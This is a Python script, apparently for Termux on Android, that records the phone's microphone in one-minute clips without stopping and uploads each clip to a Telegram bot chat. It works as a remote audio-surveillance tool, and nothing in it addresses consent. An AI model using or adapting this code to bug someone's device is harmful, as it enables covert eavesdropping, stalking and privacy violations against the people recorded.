import pyaudio
import wave
import time
import os
import requests

# =========================
# Telegram configuration
# =========================
# IMPORTANT:
# Replace these values with YOUR OWN Telegram bot token and chat ID

TELEGRAM_TOKEN = "123456789:AAABBBcccDDD_EEEfffGGG"  # <-- REPLACE WITH YOUR BOT TOKEN
CHAT_ID = "1234567890"  # <-- REPLACE WITH YOUR CHAT ID (user or group)

# =========================
# Storage configuration
# =========================
# Path to internal storage (Termux / Android)
sdcard_path = "/storage/emulated/0/MyAudio"

# Create folder if it does not exist
if not os.path.exists(sdcard_path):
    os.makedirs(sdcard_path)

# =========================
# Audio recording settings
# =========================
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
DURATION = 60    # Recording duration in seconds (1 minute)
INTERVAL = 1     # Delay between recordings in seconds

# =========================
# Send audio file to Telegram
# =========================
def send_audio_to_telegram(filename):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAudio"
    with open(filename, "rb") as audio_file:
        files = {"audio": audio_file}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("Audio file successfully sent to Telegram.")
        else:
            print(f"Error sending audio file: {response.status_code}")

# =========================
# Send text message to Telegram
# =========================
def send_message_to_telegram():
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": "Audio recording is about to arrive from the smartphone"
    }
    response = requests.post(url, data=data)

    if response.status_code == 200:
        print("Telegram message sent successfully.")
    else:
        print(f"Error sending message: {response.status_code}")

# =========================
# Record audio function
# =========================
def record_audio(filename):
    p = pyaudio.PyAudio()

    # Open microphone input stream
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    print(f"Recording audio for {DURATION} seconds...")

    frames = []
    message_sent = False  # Prevent multiple message sends

    for i in range(0, int(RATE / CHUNK * DURATION)):
        data = stream.read(CHUNK)
        frames.append(data)

        # Calculate progress percentage
        progress = (i + 1) / (RATE / CHUNK * DURATION) * 100

        # Send Telegram message at 95% progress (only once)
        if progress >= 95 and not message_sent:
            print("95% reached. Sending Telegram notification...")
            send_message_to_telegram()
            message_sent = True

        # Show progress every ~10%
        if i % int((RATE / CHUNK * DURATION) / 10) == 0:
            print(f"Recording progress: {int(progress)}%")

    print("Recording completed.")

    # Stop and close audio stream
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save audio file as WAV
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b"".join(frames))

    print(f"Audio saved as: {filename}")

    # Send audio file to Telegram
    send_audio_to_telegram(filename)

# =========================
# Main loop
# =========================
try:
    while True:
        # Generate filename based on current date and time
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(sdcard_path, f"audio_{timestamp}.wav")

        # Record and send audio
        record_audio(filename)

        # Wait before next recording
        print(f"Waiting {INTERVAL} second before next recording...")
        time.sleep(INTERVAL)

except KeyboardInterrupt:
    print("\nProgram stopped by user.")
